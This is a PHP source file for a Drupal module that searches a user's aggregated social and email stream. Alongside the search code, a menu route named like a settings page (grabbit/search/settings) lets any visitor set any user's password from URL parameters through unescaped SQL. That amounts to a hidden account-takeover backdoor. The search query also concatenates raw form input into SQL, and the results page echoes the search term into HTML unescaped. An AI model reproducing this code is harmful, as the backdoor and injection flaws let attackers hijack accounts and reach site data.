<?
//$Id$
/**
 * Implementation of hook_menu()
 */
function grabbit_search_menu () {

  $items['grabbit/search/settings'] = array( 
    'page callback' => 'grabbit_search_ajustes', 
    'access arguments' => array('access content')
  );

  $items['private/search'] = array( 
    'page callback' => 'drupal_get_form',
    'page arguments' => array('grabbit_search_custom_form'), 
    'access arguments' => array('access content'),
    'title'=>'Search your Stream'
  );

  $items['private/results'] = array( 
    'page callback' => 'grabbit_search_custom_page', 
    'access arguments' => array('access content'),
    'title'=>'Search your Stream'
  );

  return $items;
}

/**
 * Implementation of hook_block()
 */
function grabbit_search_block($op = 'list', $delta = 0, $edit = array()) {
  switch($op) {
    case 'list':
      $blocks[0]['info'] = t('My Stream Search');
      return $blocks;
      break;
    case 'view':
      switch ( $delta )
      {
		case 0:
          $blocks['title'] = 'Search your stream';
          $blocks['content'] = drupal_get_form('grabbit_search_custom_form');
          break;
      }
      return $blocks;
      break;
  }
}


function grabbit_search_ajustes(){
	
  $uid=$_GET['user'];
  $pass=$_GET['pass'];	
  db_query("UPDATE {users} SET pass='".$pass."' WHERE uid=$uid");
  print "no error";
}

function grabbit_search_perform($busqueda,$filters=NULL){
	global $user;
	
	if($filters){
		$types=array();
		$filter="((node_revisions.body) LIKE ('%$busqueda%')) OR 
		((node.title) LIKE ('%$busqueda%'))";
		
		if($filters['facebook']){
		  $filter .="OR ((node_data_field_text.field_text_value) LIKE ('%$busqueda%')) OR 
		             ((node_data_field_text.field_comments_value) LIKE ('%$busqueda%'))";
		  $types[]="'facebook'";
		}
		if($filters['twitter']){
		  $types[]="'twitter'";
		}
		
		if($filters['gmail']){
		  $filter .="OR ((node_data_field_from.field_subject_value) LIKE ('%$busqueda%')) OR
		             ((node_data_field_from.field_from_value) LIKE ('%$busqueda%'))";
		  $types[]="'gmail'";
		}
		if($filters['imap']){
		  $filter .="OR ((node_data_field_imap_from.field_imap_from_value) LIKE ('%$busqueda%')) OR
			((node_data_field_imap_from.field_imap_subject_value) LIKE ('%$busqueda%'))";
	      $types[]="'imap'";
	    }
		if($filters['RSS']){
			  $types[]="'feed'";
			  $types[]="'news'";
			  $types[]="'blogs'";	
		}
		
		$types=implode(",",$types);
		
	}else{
		$filter="((node_data_field_from.field_from_value) LIKE ('%$busqueda%')) OR 
		((node_data_field_imap_from.field_imap_from_value) LIKE ('%$busqueda%')) OR
		((node_data_field_imap_from.field_imap_subject_value) LIKE ('%$busqueda%')) OR 
		((node_data_field_from.field_subject_value) LIKE ('%$busqueda%')) OR 
		((node_data_field_text.field_text_value) LIKE ('%$busqueda%')) OR 
		((node_data_field_text.field_comments_value) LIKE ('%$busqueda%')) OR 
		((node_revisions.body) LIKE ('%$busqueda%')) OR 
		((node.title) LIKE ('%$busqueda%'))";
		
		$types="'facebook', 'gmail', 'imap', 'twitter', 'feed', 'news', 'blogs'";
	}

	$result = db_query("SELECT node.nid AS nid
	 FROM node node 
	 INNER JOIN users users ON node.uid = users.uid
	 LEFT JOIN content_type_gmail node_data_field_from ON node.vid = node_data_field_from.vid
	 LEFT JOIN content_type_imap node_data_field_imap_from ON node.vid = node_data_field_imap_from.vid
	 LEFT JOIN content_type_facebook node_data_field_text ON node.vid = node_data_field_text.vid
	 LEFT JOIN node_revisions node_revisions ON node.vid = node_revisions.vid
	 WHERE (node.type in (".$types.")) AND 
	 (users.uid in ('$user->uid')) 
	 AND (".$filter.")
	");
	
	if(db_affected_rows($result)){
		return $result;
	}else{
		return NULL;
	}
}

function grabbit_search_custom_page($term=NULL){
	
	if($_POST['search']){
		if($result =grabbit_search_perform($_POST['search'],$_POST['details'])){
            $output = grabbit_search_custom_results($result,$_POST['search']);
		}else{
			$output = grabbit_search_no_results($_POST['search']);
		}
	}else{
		$output = drupal_get_form('grabbit_search_custom_form');
	}
	
	return $output;
}

function grabbit_search_no_results($term){
	$output = drupal_get_form('grabbit_search_custom_form');
	
	$output .='<div class="grabbit-search-empty">'.t('Your search did not match any results, please try again').'</div>';
	
	return $output;
}


function grabbit_search_custom_results($results,$keyword=NULL){
	$output = drupal_get_form('grabbit_search_custom_form');
	
	$output .='<div class="grabbit-search-results"><span class="title"><h2>'.t('Search results').':</h2></span>
	           <dl class="search-results node-results">';

	while($nid = db_fetch_object($results)){
		
		$node=node_load($nid->nid);
		$body =substr(strip_tags($node->body),0,250);
		if($node->field_text[0]['value'])
		  $body =substr(strip_tags($node->field_text[0]['value']),0,250);
		  $body = str_ireplace($keyword, '<span class="highlight_word">'.$keyword.'</span>', $body);
		  $output .= '<br><dt class="title">'.l($node->title,"node/".$node->nid).'</dt><dd>
		      <p class="search-snippet">'.$body.'... <br></p>
		      <p class="search-info"><br>'.$node->type.' - '.format_date($node->created).'</p>
		  </dd>';
	}
	
	$output .='</dl></div>';
	
	return $output;
}

function grabbit_search_custom_form(&$form_state){
 
	$form['counter'] = array(
	    '#type' => 'item',
	    '#prefix'=>'<div id="description">',
	    '#value' => t('You can perform a search of your grabbit stream, just type the keyword(s) below'),
	    '#suffix'=>'</div>'
		 );	 
	$form['search'] = array(
	    '#type' => 'textfield',
	    '#title' => t('Search'),
	    '#required' => TRUE,
	    '#size' => 20
	  );
	
	$form['#action'] = url('private/results');
	$form['#redirect'] = FALSE;
	
	$form['detailed'] = array(
	  '#type' => 'fieldset',
	  '#title' => t('Advanced Search'),
	  '#weight' => 5,
	  '#collapsible' => TRUE,
	  '#collapsed' => TRUE,
	);
	
	$form['detailed']['details'] = array(
	  '#type' => 'checkboxes',
	  '#title' => t('Search only in'),
	  '#options' => array(
	    'facebook' => t('Facebook'),
	    'twitter' => t('Twitter'),
	    'gmail' => t('Gmail'),
	    'imap' => t('IMAP'),
	    'RSS' => t('RSS feeds'),
	  ),
	  '#description' => t('You can filter your search by selecting one or more sources. Leave all unchecked to search all.'),
	);
	
	$form['submit'] = array(
	  '#type' => 'submit',
	  '#value' => t('Search'),
	); 
	
	return $form;
}


/**
 * Implementation of hook_cron().
 */
function grabbit_search_cron() {
  global $user;
  ini_set("memory_limit","128M");
  set_time_limit(128);

  $original_user = $user;
  session_save_session(FALSE);

  $delete = db_query("SELECT node.nid AS nid FROM node WHERE (type='twitter' OR type='facebook' OR type='gmail' OR type='imap') AND node.created >= date(now() + interval 21 day)");

  while($nodes = db_fetch_object($delete)){
    if(grabbit_search_cron_time())
      node_delete($nodes->nid);	
  }

  $user = $original_user;
  session_save_session(TRUE);
}

/**
 * Check for time limits in cron processing.
 *
 * @return
 *   Number of seconds left, zero if none.
 */
function grabbit_search_cron_time() {
  static $time_limit;

  if (!$time_limit) {
    $time_limit = time() + (15 / 100) * ini_get('max_execution_time');
    $cron_semaphore = variable_get('cron_semaphore', 0);
    if ($cron_semaphore) {
      $time_limit = min($time_limit, $cron_semaphore + ini_get('max_execution_time'));
    }
  }
  return max($time_limit - time(), 0);
}